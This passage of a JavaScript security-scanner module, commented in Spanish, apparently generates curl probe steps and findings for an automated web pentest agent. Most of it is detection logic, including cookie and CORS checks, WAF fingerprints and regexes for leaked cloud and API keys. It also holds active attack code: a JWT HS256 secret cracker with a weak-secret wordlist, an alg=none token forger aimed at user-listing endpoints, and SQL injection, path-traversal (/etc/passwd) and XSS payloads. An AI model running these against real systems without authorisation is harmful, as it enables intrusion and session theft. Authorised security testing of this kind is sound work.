        remediation: "Marcar la cookie con Secure (y HttpOnly/SameSite si corresponde).",
      });
    }
    if (looksSensitive && !/;\s*httponly\b/i.test(c)) {
      out.push({
        title: `Cookie de sesión «${name}» sin flag HttpOnly`,
        severity: "High",
        description: `La cookie ${name} (aparenta ser de sesión/autenticación) no tiene HttpOnly (CWE-1004): cualquier XSS en el sitio puede leerla vía document.cookie y robar la sesión.`,
        remediation: "Marcar las cookies de sesión con HttpOnly.",
      });
    }
    if (!/;\s*samesite\s*=/i.test(c)) {
      out.push({
        title: `Cookie «${name}» sin atributo SameSite`,
        severity: "Low",
        description: `La cookie ${name} no define SameSite (CWE-352): se envía también en peticiones cross-site, ampliando la superficie de CSRF si no hay otra mitigación (token anti-CSRF).`,
        remediation: "Definir SameSite=Lax o Strict según el flujo de la aplicación.",
      });
    }
  }
  return out;
}

/** Origen no confiable usado para detectar reflejo CORS (no confundir con exploit). */
export const CORS_PROBE_ORIGIN = "https://ds-cors-probe.invalid";

/**
 * Clasifica una mala configuración CORS a partir de las cabeceras devueltas
 * al enviar CORS_PROBE_ORIGIN como Origin. Solo detección: no hace ninguna
 * petición cross-origin real ni exfiltra nada.
 * https://hacktricks.wiki/en/pentesting-web/cors-bypass.html
 */
export function corsFinding(blob) {
  const b = String(blob || "");
  const acaoMatch = b.match(/access-control-allow-origin:\s*([^\r\n]+)/i);
  if (!acaoMatch) return null;
  const acao = acaoMatch[1].trim();
  const hasCreds = /access-control-allow-credentials:\s*true/i.test(b);
  const hacktricks = HT + "cors-bypass.html";
  if (acao === "*" && hasCreds) {
    return {
      title: "CORS: Access-Control-Allow-Origin * junto con Allow-Credentials: true",
      severity: "High",
      hacktricks,
      description:
        "La respuesta combina un origen comodín (*) con Access-Control-Allow-Credentials: true. El navegador debería rechazar esa combinación, pero indica una implementación manual insegura (p. ej. reflejo condicional del Origin) que suele fallar en algún endpoint del mismo servicio.",
      remediation: "No combinar wildcard con credenciales; usar allow-list explícita de orígenes de confianza.",
    };
  }
  if (acao.includes(CORS_PROBE_ORIGIN)) {
    return {
      title: hasCreds
        ? "CORS: refleja cualquier Origin y permite credenciales (robo de sesión cross-origin)"
        : "CORS: refleja cualquier Origin sin validar contra allow-list",
      severity: hasCreds ? "Critical" : "High",
      hacktricks,
      description: `El servidor devolvió Access-Control-Allow-Origin: ${acao} en respuesta a un Origin de prueba no confiable (${CORS_PROBE_ORIGIN}): refleja el Origin recibido en vez de validarlo contra una lista blanca.${hasCreds ? " Además envía Allow-Credentials: true, permitiendo a cualquier sitio leer respuestas autenticadas de la víctima." : ""}`,
      remediation: "Validar el Origin contra una allow-list estricta en servidor; no reflejar el header recibido; nunca combinarlo con Allow-Credentials: true salvo orígenes explícitamente confiables.",
    };
  }
  return null;
}

/**
 * Señales genéricas (cualquier app, no solo DVWA).
 * Si aparecen en la salida de curl/whatweb/nikto, se clasifica la clase.
 */
export const SURFACE_SIGNALS = [
  {
    re: /You have an error in your SQL syntax|mysql_fetch|supplied argument is not a valid MySQL|pg_query\(|ORA-\d{5}|Unclosed quotation mark/i,
    title: "Errores SQL reflejados en la respuesta HTTP",
    severity: "High",
    description:
      "La aplicación devuelve errores de motor SQL al cliente. Es un indicador de superficie de inyección (CWE-89) y de fuga de esquema. Defensa: no mostrar errores de BD; consultas parametrizadas.",
    remediation: "Ocultar errores SQL; parametrizar; logs solo en servidor.",
  },
  {
    re: /PHP Version\s+\d+\.\d+/i,
    title: "Cuerpo phpinfo() en respuesta HTTP",
    severity: "High",
    description:
      "La respuesta incluye el volcado de phpinfo() (versión, módulos, rutas). Facilita reconocimiento; no es RCE por sí solo.",
    remediation: "Eliminar phpinfo.php y llamadas a phpinfo() fuera de lab.",
  },
  {
    re: /\$_DVWA|db_password|define\s*\(\s*['\"]MYSQL/i,
    title: "Secretos de aplicación en cuerpo HTTP",
    severity: "Critical",
    description:
      "El cuerpo HTTP contiene directivas de configuración o credenciales de BD. Fuga de secretos (CWE-538).",
    remediation: "Retirar el fichero del document root; rotar credenciales; denegar .inc/.bak/.env.",
  },
  {
    re: /allow_url_include\s*=\s*On/i,
    title: "allow_url_include habilitado",
    severity: "High",
    description:
      "php.ini (o phpinfo) muestra allow_url_include=On: habilita inclusión remota si hay LFI. Debe estar Off.",
    remediation: "allow_url_include=Off; open_basedir; no pasar paths de usuario a include.",
  },
  {
    re: /^TRACE\s+\/\S*\s+HTTP\/1\.[01]/im,
    title: "Método HTTP TRACE habilitado (posible Cross-Site Tracing)",
    severity: "Medium",
    // scopeKey: el heurístico prioriza la salida de p1-curl-trace-probe (su
    // propio paso) en vez del blob completo, para no confundir un eco real
    // de TRACE con esa misma línea apareciendo por casualidad en otra salida.
    scopeKey: "trace",
    description:
      "El servidor responde a una petición TRACE reflejando la petición completa en el cuerpo, incluidas cabeceras que el navegador normalmente oculta a JavaScript (p. ej. cookies HttpOnly). Combinado con XSS, permite robarlas (XST).",
    remediation: "Deshabilitar los métodos TRACE y TRACK en el servidor web; permitir solo los métodos HTTP necesarios.",
  },
];

function escapeRe(s) {
  return String(s).replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

export function modulePathRe(path) {
  return new RegExp(escapeRe(path), "i");
}

/** Pasos curl del playbook para módulos DVWA (fase 2 o 3). */
export function dvwaModuleCurlSteps(step, prefix, baseUrl, cookie, maxTime = "15") {
  return DVWA_MODULES.map((m) =>
    step(`${prefix}-${m.stepId}`, "curl", ["-s", "-L", "--max-time", maxTime, "-b", cookie, baseUrl + m.path], null, {
      desc: m.probeDesc,
    }),
  );
}

/** Pasos curl de sondas genéricas de exposición (cualquier stack, fase 1). */
export function genericExposureCurlSteps(step, prefix, baseUrl, maxTime = "12") {
  return GENERIC_EXPOSURE_PROBES.map((p) =>
    step(`${prefix}-${p.stepId}`, "curl", ["-s", "-L", "--max-time", maxTime, baseUrl + p.path], null, {
      desc: `Sonda de exposición: ${p.path}`,
    }),
  );
}

/* ------------------------------------------------------------------------ *
 * JWT: crackeo offline de secreto débil (HS256) y bypass alg=none.
 * Solo cómputo local (SHA-256/HMAC puro JS, sin llamada de red para el
 * crackeo) + una petición HTTP activa por endpoint para probar el bypass,
 * misma clase de riesgo que las sondas de SQLi/NoSQLi login ya existentes.
 * https://hacktricks.wiki/en/pentesting-web/hacking-jwt-json-web-tokens.html
 * ------------------------------------------------------------------------ */

function rotr(x, n) {
  return (x >>> n) | (x << (32 - n));
}

const SHA256_K = [
  0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
  0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
  0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
  0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
  0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
  0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
  0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
  0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
];

/** SHA-256 puro JS (sin dependencias): agente corre en navegador, no Node. */
function sha256(bytes) {
  const l = bytes.length;
  const withPad = new Uint8Array((((l + 8) >> 6) << 6) + 64);
  withPad.set(bytes);
  withPad[l] = 0x80;
  const bitLen = l * 8;
  const dv = new DataView(withPad.buffer);
  dv.setUint32(withPad.length - 4, bitLen >>> 0, false);
  dv.setUint32(withPad.length - 8, Math.floor(bitLen / 0x100000000), false);

  let h0 = 0x6a09e667, h1 = 0xbb67ae85, h2 = 0x3c6ef372, h3 = 0xa54ff53a;
  let h4 = 0x510e527f, h5 = 0x9b05688c, h6 = 0x1f83d9ab, h7 = 0x5be0cd19;
  const w = new Uint32Array(64);

  for (let offset = 0; offset < withPad.length; offset += 64) {
    for (let i = 0; i < 16; i++) w[i] = dv.getUint32(offset + i * 4, false);
    for (let i = 16; i < 64; i++) {
      const s0 = rotr(w[i - 15], 7) ^ rotr(w[i - 15], 18) ^ (w[i - 15] >>> 3);
      const s1 = rotr(w[i - 2], 17) ^ rotr(w[i - 2], 19) ^ (w[i - 2] >>> 10);
      w[i] = (w[i - 16] + s0 + w[i - 7] + s1) | 0;
    }
    let a = h0, b = h1, c = h2, d = h3, e = h4, f = h5, g = h6, h = h7;
    for (let i = 0; i < 64; i++) {
      const S1 = rotr(e, 6) ^ rotr(e, 11) ^ rotr(e, 25);
      const ch = (e & f) ^ (~e & g);
      const temp1 = (h + S1 + ch + SHA256_K[i] + w[i]) | 0;
      const S0 = rotr(a, 2) ^ rotr(a, 13) ^ rotr(a, 22);
      const maj = (a & b) ^ (a & c) ^ (b & c);
      const temp2 = (S0 + maj) | 0;
      h = g; g = f; f = e; e = (d + temp1) | 0;
      d = c; c = b; b = a; a = (temp2 + temp1) | 0;
    }
    h0 = (h0 + a) | 0; h1 = (h1 + b) | 0; h2 = (h2 + c) | 0; h3 = (h3 + d) | 0;
    h4 = (h4 + e) | 0; h5 = (h5 + f) | 0; h6 = (h6 + g) | 0; h7 = (h7 + h) | 0;
  }
  const out = new Uint8Array(32);
  const odv = new DataView(out.buffer);
  [h0, h1, h2, h3, h4, h5, h6, h7].forEach((v, i) => odv.setUint32(i * 4, v >>> 0, false));
  return out;
}

function concatBytes(a, b) {
  const out = new Uint8Array(a.length + b.length);
  out.set(a, 0);
  out.set(b, a.length);
  return out;
}

function hmacSha256(keyBytes, msgBytes) {
  const blockSize = 64;
  let key = keyBytes.length > blockSize ? sha256(keyBytes) : keyBytes;
  if (key.length < blockSize) {
    const k = new Uint8Array(blockSize);
    k.set(key);
    key = k;
  }
  const oKeyPad = new Uint8Array(blockSize);
  const iKeyPad = new Uint8Array(blockSize);
  for (let i = 0; i < blockSize; i++) {
    oKeyPad[i] = key[i] ^ 0x5c;
    iKeyPad[i] = key[i] ^ 0x36;
  }
  return sha256(concatBytes(oKeyPad, sha256(concatBytes(iKeyPad, msgBytes))));
}

function base64UrlToBytes(b64url) {
  const b64 = String(b64url || "").replace(/-/g, "+").replace(/_/g, "/");
  const pad = b64.length % 4 === 0 ? "" : "=".repeat(4 - (b64.length % 4));
  const bin = atob(b64 + pad);
  const bytes = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
  return bytes;
}

function bytesToBase64Url(bytes) {
  let bin = "";
  for (let i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
  return btoa(bin).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}

/** Coincidencia de longitud fija primero: evita comparar arrays desiguales. */
function bytesEqual(a, b) {
  if (a.length !== b.length) return false;
  for (let i = 0; i < a.length; i++) if (a[i] !== b[i]) return false;
  return true;
}

/** Cualquier JWT en texto de respuesta (login, /whoami, etc.). */
export const JWT_TOKEN_RE = /eyJ[\w-]+\.[\w-]+\.[\w-]+/;

/**
 * Diccionario curado de secretos HS256 habituales (defaults de librería,
 * ejemplos de documentación, nombres de app genéricos) — no un dump de
 * contraseñas filtradas. Igual de curado que HYDRA_USERLIST/PASSLIST.
 */
export const JWT_WEAK_SECRETS = [
  "secret", "Secret", "SECRET", "secretkey", "secret_key", "your-256-bit-secret",
  "changeme", "change-me", "password", "123456", "12345678", "admin", "administrator",
  "jwtsecret", "jwt_secret", "JWT_SECRET", "jwt-secret", "supersecret", "super-secret",
  "super_secret_key", "mysecretkey", "my-secret-key", "topsecret", "top-secret",
  "shhhhh", "shh", "dev", "development", "test", "testsecret", "default", "defaultsecret",
  "key", "qwerty", "letmein", "express-secret", "nodejs-secret", "s3cr3t", "keyboardcat",
  "verysecretkey", "0000000000000000", "1111111111111111", "",
];

/**
 * Intenta romper el secreto HS256 de un JWT contra un diccionario curado
 * (cómputo local, sin red). Solo aplica a alg=HS256; RS/ES256 no son
 * crackeables así (clave asimétrica). Devuelve el secreto si acierta.
 */
export function crackJwtHs256Secret(token, wordlist = JWT_WEAK_SECRETS) {
  const parts = String(token || "").split(".");
  if (parts.length !== 3) return null;
  const [headerB64, payloadB64, sigB64] = parts;
  let header;
  try {
    header = JSON.parse(new TextDecoder().decode(base64UrlToBytes(headerB64)));
  } catch {
    return null;
  }
  if (!/^HS256$/i.test(String(header.alg || ""))) return null;
  let targetSig;
  try {
    targetSig = base64UrlToBytes(sigB64);
  } catch {
    return null;
  }
  const signingInput = new TextEncoder().encode(`${headerB64}.${payloadB64}`);
  for (const secret of wordlist) {
    const mac = hmacSha256(new TextEncoder().encode(secret), signingInput);
    if (bytesEqual(mac, targetSig)) return secret;
  }
  return null;
}

/**
 * Reforja un JWT capturado con header {"alg":"none"} y firma vacía —
 * bypass clásico cuando el backend no verifica alg antes de confiar en el
 * token. Mantiene el payload original (mismos claims/rol) tal cual.
 */
export function forgeAlgNoneToken(token) {
  const parts = String(token || "").split(".");
  if (parts.length !== 3) return null;
  const [, payloadB64] = parts;
  const forgedHeader = bytesToBase64Url(new TextEncoder().encode(JSON.stringify({ alg: "none", typ: "JWT" })));
  return `${forgedHeader}.${payloadB64}.`;
}

/**
 * Endpoints típicamente autenticados donde probar el token alg=none forjado.
 * Se prefieren rutas de colección REST (Sequelize/Express-style) que con
 * middleware de auth estándar responden 401 limpio sin token — así el
 * heurístico (2xx en vez de 401/403) es una señal fiable. Confirmado en
 * vivo contra Juice Shop: /api/Users/ da 401 sin token, y con el JWT
 * original o con el forjado alg=none devuelve el mismo dump completo de
 * usuarios — bypass real, no falso positivo por un endpoint que ya
 * responde 200 sin sesión (ese fue el caso descartado de /rest/user/whoami).
 */
export const JWT_ALGNONE_PROBE_PATHS = [
  "/api/Users/",
  "/api/users",
];

/** Pasos curl con el JWT alg=none forjado contra endpoints autenticados. */
export function jwtAlgNoneCurlSteps(step, prefix, baseUrl, forgedToken, maxTime = "12") {
  if (!forgedToken) return [];
  return JWT_ALGNONE_PROBE_PATHS.map((path, i) =>
    step(`${prefix}-${i + 1}`, "curl", [
      "-s", "-L", "--max-time", maxTime,
      "-H", `Authorization: Bearer ${forgedToken}`,
      "-w", "\nDS_HTTP:%{http_code}\n",
      baseUrl + path,
    ], null, {
      desc: `JWT alg=none forjado contra ${path}`,
    }),
  );
}

/* ------------------------------------------------------------------------ *
 * OSINT pasivo: Wayback Machine (archive.org) — rutas/endpoints viejos que
 * el sitio ya no enlaza pero siguen indexados históricamente. Solo lectura
 * contra un servicio de terceros, sin tocar el target.
 * https://hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html
 * ------------------------------------------------------------------------ */
export function waybackOsintSteps(step, root) {
  if (!root || !root.includes(".")) return [];
  return [
    // matchType=domain es la forma eficiente de pedir "este dominio y sus
    // subdominios" al CDX API; el patrón *.dominio/* con wildcard en el
    // propio url= es más lento y a veces el servicio tarda >20s en
    // responder (servicio de terceros, fuera de nuestro control).
    step("p1-osint-wayback-cdx", "curl", [
      "-s", "--max-time", "30",
      `https://web.archive.org/cdx/search/cdx?url=${root}&matchType=domain&output=text&fl=original&collapse=urlkey&limit=200`,
    ], null, {
      desc: "Rutas históricas indexadas por Wayback Machine (archive.org)",
    }),
  ];
}

/* ------------------------------------------------------------------------ *
 * Código fuente: secretos hardcodeados en bundles JS ya servidos por la
 * app (SPA React/Vue/Angular). Puramente pasivo: solo analiza texto de
 * ficheros que la propia app expone públicamente.
 * ------------------------------------------------------------------------ */
export const JS_BUNDLE_PROBE_PATHS = [
  "/main.js", "/bundle.js", "/app.js",
  "/static/js/main.js", "/assets/index.js", "/dist/main.js",
];

export function jsBundleCurlSteps(step, prefix, baseUrl, maxTime = "12") {
  return JS_BUNDLE_PROBE_PATHS.map((path, i) =>
    step(`${prefix}-${i + 1}`, "curl", [
      "-s", "-L", "--max-time", maxTime, "-w", "\nDS_HTTP:%{http_code}\n", baseUrl + path,
    ], null, {
      desc: `Bundle JS ${path} — buscar secretos hardcodeados`,
    }),
  );
}

const JS_SECRET_SIGNATURES = [
  { label: "AWS Access Key ID", re: /AKIA[0-9A-Z]{16}/, cwe: "CWE-798" },
  { label: "AWS Secret Access Key", re: /aws(.{0,20})?(secret|access)?[_-]?key['"]?\s*[:=]\s*['"][0-9a-zA-Z/+]{40}['"]/i, cwe: "CWE-798" },
  { label: "Google API Key", re: /AIza[0-9A-Za-z\-_]{35}/, cwe: "CWE-798" },
  { label: "Google/GCP Service Account JSON", re: /"type":\s*"service_account"/i, cwe: "CWE-798" },
  { label: "Stripe Secret Key (live)", re: /sk_live_[0-9a-zA-Z]{20,}/, cwe: "CWE-798" },
  { label: "Stripe Restricted Key (live)", re: /rk_live_[0-9a-zA-Z]{20,}/, cwe: "CWE-798" },
  { label: "Slack Token", re: /xox[baprs]-[0-9a-zA-Z-]{10,}/, cwe: "CWE-798" },
  { label: "Slack Webhook URL", re: /hooks\.slack\.com\/services\/T[0-9A-Z]{8,}\/B[0-9A-Z]{8,}\/[0-9a-zA-Z]{24}/, cwe: "CWE-798" },
  { label: "GitHub Personal Access Token", re: /gh[pousr]_[A-Za-z0-9]{36}/, cwe: "CWE-798" },
  { label: "GitHub Fine-Grained Token", re: /github_pat_[0-9A-Za-z_]{22,}/, cwe: "CWE-798" },
  { label: "Clave privada embebida", re: /-----BEGIN (RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----/, cwe: "CWE-321" },
  { label: "Twilio Account SID/Auth Token", re: /AC[0-9a-f]{32}/, cwe: "CWE-798" },
  { label: "SendGrid API Key", re: /SG\.[0-9A-Za-z_-]{22}\.[0-9A-Za-z_-]{43}/, cwe: "CWE-798" },
  { label: "Mailgun API Key", re: /key-[0-9a-f]{32}/, cwe: "CWE-798" },
  { label: "Heroku API Key", re: /heroku['"]?\s*[:=]\s*['"][0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}['"]/i, cwe: "CWE-798" },
  { label: "npm Access Token", re: /npm_[0-9A-Za-z]{36}/, cwe: "CWE-798" },
  { label: "PyPI API Token", re: /pypi-AgEIcHlwaS5vcmc[0-9A-Za-z_-]{50,}/, cwe: "CWE-798" },
  { label: "Discord Webhook URL", re: /discord(app)?\.com\/api\/webhooks\/\d{17,20}\/[0-9A-Za-z_-]{60,}/, cwe: "CWE-798" },
  { label: "Firebase Cloud Messaging/Server Key", re: /AAAA[0-9A-Za-z_-]{7}:[0-9A-Za-z_-]{140,}/, cwe: "CWE-798" },
  { label: "DigitalOcean Personal Access Token", re: /dop_v1_[0-9a-f]{64}/, cwe: "CWE-798" },
  { label: "Shopify Access Token", re: /shp(at|ca|pa|ss)_[0-9a-f]{32}/, cwe: "CWE-798" },
  { label: "JSON Web Token con secreto en URL", re: /[?&](token|jwt|access_token)=eyJ[0-9A-Za-z_-]{10,}\.[0-9A-Za-z_-]{10,}\.[0-9A-Za-z_-]{10,}/, cwe: "CWE-598" },
];

const JS_SECRET_PLACEHOLDER_RE = /^(x+|0+|1+|dummy|example|test|changeme|xxxx+|yyyy+|your[-_]?\w*|placeholder|undefined|null|redacted|\*+)$/i;

/**
 * Escanea el cuerpo de un bundle JS ya descargado por patrones de secretos
 * de proveedores conocidos (formato específico, bajo falso-positivo) y,
 * de forma más ruidosa, por asignaciones genéricas api_key/secret/token
 * con valor largo no-placeholder (a confirmar manualmente).
 */
export function jsSecretFindings(jsText, path) {
  const text = String(jsText || "");
  const out = [];
  for (const sig of JS_SECRET_SIGNATURES) {
    const m = text.match(sig.re);
    if (!m) continue;
    out.push({
      title: `${sig.label} hardcodeada en bundle JS (${path})`,
      severity: "Critical",
      description: `El bundle JavaScript servido en ${path} contiene un valor con el formato de ${sig.label} (empieza «${m[0].slice(0, 10)}…») embebido en texto plano (${sig.cwe}): cualquiera que descargue el bundle público obtiene la credencial. Es un error habitual en SPAs que ponen claves de backend/servicios en el código cliente.`,
      remediation: "Retirar la clave del bundle cliente; moverla a un backend/proxy que la use server-side; rotar la credencial expuesta de inmediato (puede llevar tiempo cacheada en CDN/buscadores).",
    });
  }
  const genericRe = /(api[_-]?key|secret|access[_-]?token|auth[_-]?token)\s*[:=]\s*["']([A-Za-z0-9_\-]{16,})["']/gi;
  let gm;
  let genericCount = 0;
  while ((gm = genericRe.exec(text)) && genericCount < 3) {
    const val = gm[2];
    if (JS_SECRET_PLACEHOLDER_RE.test(val)) continue;
    genericCount++;
    out.push({
      title: `Posible secreto hardcodeado en bundle JS (${path}): ${gm[1]}`,
      severity: "Medium",
      description: `Se encontró la asignación «${gm[1]}: ${val.slice(0, 6)}…» en el bundle JavaScript servido en ${path} (CWE-798). El formato no corresponde a un proveedor conocido, así que hay que confirmar a mano si es una credencial real o una clave intencionadamente pública (p. ej. Stripe publishable key, Firebase apiKey de Web).`,
      remediation: "Confirmar si el valor es sensible; si lo es, moverlo a backend y rotarlo. Si es una clave pública legítima, documentar que es intencional.",
    });
  }
  return out;
}

const JS_CODE_DANGER_SIGNATURES = [
  {
    kind: "sqli_concat",
    label: "SQL armado por concatenación de string",
    cwe: "CWE-89",
    severity: "Critical",
    // Captures the request-param name used inside a raw/whereRaw-style
    // string concatenation, e.g. whereRaw("code = '" . $request->code . "'").
    re: /where[rR]aw\([\s\S]*?\.\s*\$?request(?:->|\.)(\w+)/,
  },
  {
    kind: "lfi_include",
    label: "Lectura de fichero desde entrada de usuario sin sanitizar",
    cwe: "CWE-98",
    severity: "Critical",
    re: /(?:file_get_contents|include|require)\s*\(\s*\$_(?:GET|REQUEST|POST)\[['"](\w+)['"]\]/,
  },
  {
    kind: "xss_unescaped_echo",
    label: "Salida de parámetro sin escapar (echo/print directo)",
    cwe: "CWE-79",
    severity: "High",
    re: /(?:echo|print)\s+\$_(?:GET|REQUEST|POST)\[['"](\w+)['"]\]/,
  },
  {
    kind: "authz_missing_middleware",
    label: "Ruta administrativa sin middleware de autenticación visible",
    cwe: "CWE-862",
    severity: "High",
    re: /Route::\w+\(\s*['"](\/(?:admin|internal|staff)[^'"]*)['"]\s*,[^)]*\)(?!\s*->\s*middleware)/,
  },
];

/**
 * Escanea contenido fuente/config ya filtrado por el propio catálogo
 * (.env, .git/config, source maps, backups — ver env-file/git-head/etc.
 * en este mismo archivo) buscando patrones de código peligrosos por
 * clase de vulnerabilidad, y devuelve hasta 5 hits con el parámetro/ruta
 * exacto encontrado para poder construir una sonda dirigida (no genérica).
 */
export function extractDangerousCodePatterns(blob) {
  const text = String(blob || "");
  const hits = [];
  for (const sig of JS_CODE_DANGER_SIGNATURES) {
    const m = text.match(sig.re);
    if (!m) continue;
    const captured = m[1] || null;
    hits.push({
      kind: sig.kind,
      label: sig.label,
      cwe: sig.cwe,
      severity: sig.severity,
      snippet: m[0].slice(0, 200),
      param: sig.kind === "authz_missing_middleware" ? null : captured,
      route: sig.kind === "authz_missing_middleware" ? captured : null,
    });
    if (hits.length >= 5) break;
  }
  return hits;
}

const CODE_DANGER_PROBE_BUILDERS = {
  sqli_concat: (hit, baseUrl) => ["-s", "-L", "--max-time", "15", "-G", baseUrl,
    "--data-urlencode", `${hit.param}=x' OR '1'='1`],
  lfi_include: (hit, baseUrl) => ["-s", "-L", "--max-time", "15", "-G", baseUrl,
    "--data-urlencode", `${hit.param}=file:///etc/passwd`],
  xss_unescaped_echo: (hit, baseUrl) => ["-s", "-L", "--max-time", "15", "-G", baseUrl,
    "--data-urlencode", `${hit.param}=<script>alert(1)</script>`],
  authz_missing_middleware: (hit, baseUrl) => {
    const url = new URL(hit.route, baseUrl || "http://localhost").toString();
    return ["-s", "-L", "--max-time", "15", url];
  },
};

/**
 * Sondas dirigidas por hallazgo de código peligroso (mirror de
 * secretValidateCurlSteps): un hit trae ya el parámetro o ruta exactos,
 * así que la sonda ataca ese punto en vez de repetir el catálogo genérico.
 */
export function codeDangerProbeSteps(step, hits, baseUrl = "") {
  const list = Array.isArray(hits) ? hits.slice(0, 3) : [];
  return list.map((hit, i) => {
    const builder = CODE_DANGER_PROBE_BUILDERS[hit.kind];
    if (!builder) return null;
    return step(`p2-codeguided-${i + 1}`, "curl", builder(hit, baseUrl), null, {
      desc: `Sonda dirigida por código fuente filtrado: ${hit.label} (${hit.kind})`,
      codeDangerKind: hit.kind,
      codeDangerCwe: hit.cwe,
      codeDangerSeverity: hit.severity,
    });
  }).filter(Boolean);
}

/* ------------------------------------------------------------------------ *
 * Fingerprint de WAF/CDN (pasivo, solo cabeceras ya obtenidas) — misma
 * lógica que wafw00f: firmas conocidas en headers/cookies de la raíz.
 * https://hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html
 * ------------------------------------------------------------------------ */
const WAF_SIGNATURES = [
  { name: "Cloudflare", re: /cf-ray\s*:|server:\s*cloudflare|__cf_bm=|cf-mitigated\s*:/i },
  { name: "AWS CloudFront/WAF", re: /x-amz-cf-id\s*:|via:.*cloudfront|x-amzn-waf-|x-amzn-errortype:\s*waf/i },
  { name: "Akamai", re: /server:\s*akamaighost|x-akamai|akamai-ghost/i },
  { name: "Imperva/Incapsula", re: /x-iinfo\s*:|incap_ses_|visid_incap_/i },
  { name: "Sucuri", re: /x-sucuri-id\s*:|server:\s*sucuri/i },
  { name: "F5 BIG-IP ASM", re: /x-wa-info\s*:|bigipserver|ts[0-9a-f]{8}=/i },
  { name: "Azure Front Door", re: /x-azure-ref\s*:|x-fd-healthprobe/i },
  { name: "Fastly", re: /via:.*fastly|x-served-by:\s*cache-/i },
  { name: "ModSecurity", re: /mod_security|modsecurity|server:\s*modsec/i },
  { name: "FortiWeb/FortiGate", re: /fortiweb|fortigate|fgd_icon/i },
  { name: "Barracuda", re: /barra_counter_session|barracuda/i },
  { name: "Wordfence", re: /wordfence|wfwaf/i },
];

export function wafFindings(headText) {
  const h = String(headText || "");
  if (!h.trim()) return [];
  for (const sig of WAF_SIGNATURES) {
    if (sig.re.test(h)) {
      return [{
        title: `WAF/CDN identificado: ${sig.name}`,
        severity: "Info",
        description: `Las cabeceras de respuesta identifican ${sig.name} delante de la aplicación (huella pasiva, sin payload de prueba). Esto no es una vulnerabilidad: es contexto de gobierno — explica por qué ciertas sondas activas pueden llegar bloqueadas/alteradas y documenta que hay una capa de defensa perimetral.`,
        remediation: "Ninguna: es información de contexto. Si se esperaba WAF y no aparece ninguna firma, valorar añadir uno.",
      }];
    }
  }
  return [];
}

/* ------------------------------------------------------------------------ *
 * Fingerprint de proveedor cloud (AWS) — pasivo, cabeceras de CloudFront /
 * API Gateway / ALB. Igual que WAF: contexto de gobierno, no vulnerabilidad
 * por sí solo.
 * ------------------------------------------------------------------------ */
export function cloudProviderFindings(headText) {
  const h = String(headText || "");
  if (!h.trim()) return [];
  if (/x-amz-cf-id\s*:|x-amzn-requestid\s*:|x-amzn-trace-id\s*:|x-amz-apigw-id\s*:/i.test(h)) {
    return [{
      title: "Infraestructura identificada como AWS (CloudFront/API Gateway/ALB)",
      severity: "Info",
      description: "Las cabeceras de respuesta (x-amz-cf-id, x-amzn-requestid, x-amz-apigw-id, etc.) identifican infraestructura AWS delante de la aplicación. Contexto de gobierno: si hay hallazgos de credenciales expuestas, revisar también IAM/S3/metadata de instancia como superficie relacionada.",
      remediation: "Ninguna: es información de contexto para priorizar la revisión de configuración cloud (IAM, S3, Security Groups).",
    }];
  }
  return [];
}

/* ------------------------------------------------------------------------ *
 * Bucket S3 público — si algún recurso ya descargado (HTML/JS) referencia
 * un bucket S3, se comprueba con un GET de solo lectura si el listado es
 * público (autoindex de S3), igual de pasivo que comprobar un directorio
 * listable en el propio servidor.
 * ------------------------------------------------------------------------ */
export const S3_BUCKET_HOST_RE = /([a-z0-9][a-z0-9.\-]{1,61}[a-z0-9])\.s3[.\-][a-z0-9\-]*\.amazonaws\.com/i;

export function extractS3BucketHost(rawBlob) {
  const m = String(rawBlob || "").match(S3_BUCKET_HOST_RE);
  return m ? m[0] : null;
}

export function s3BucketCheckStep(step, bucketHost, maxTime = "12") {
  if (!bucketHost) return [];
  return [
    step("p1-s3-bucket-check", "curl", [
      "-s", "-L", "--max-time", maxTime, `https://${bucketHost}/`,
    ], null, {
      desc: `Bucket S3 referenciado por la app: ¿listado público? (${bucketHost})`,
    }),
  ];
}

export const S3_LISTING_RE = /<ListBucketResult/i;

/* ------------------------------------------------------------------------ *
 * Bucket Azure Blob / GCS público — mismo patrón pasivo que S3: si algún
 * recurso ya descargado referencia un contenedor de otro proveedor cloud,
 * se comprueba con un GET de solo lectura si el listado es público.
 * ------------------------------------------------------------------------ */
export const AZURE_BLOB_HOST_RE = /([a-z0-9]{3,24})\.blob\.core\.windows\.net(?:\/([a-z0-9][a-z0-9-]{1,61}[a-z0-9]))?/i;
export const GCS_BUCKET_HOST_RE = /storage\.googleapis\.com\/([a-z0-9][a-z0-9_.\-]{1,220}[a-z0-9])/i;

export function extractAzureBlobContainer(rawBlob) {
  const m = String(rawBlob || "").match(AZURE_BLOB_HOST_RE);
  if (!m) return null;
  return { account: m[1], container: m[2] || null, matched: m[0] };
}

export function extractGcsBucket(rawBlob) {
  const m = String(rawBlob || "").match(GCS_BUCKET_HOST_RE);
  return m ? m[1] : null;
}

export function azureBlobCheckStep(step, blobRef, maxTime = "12") {
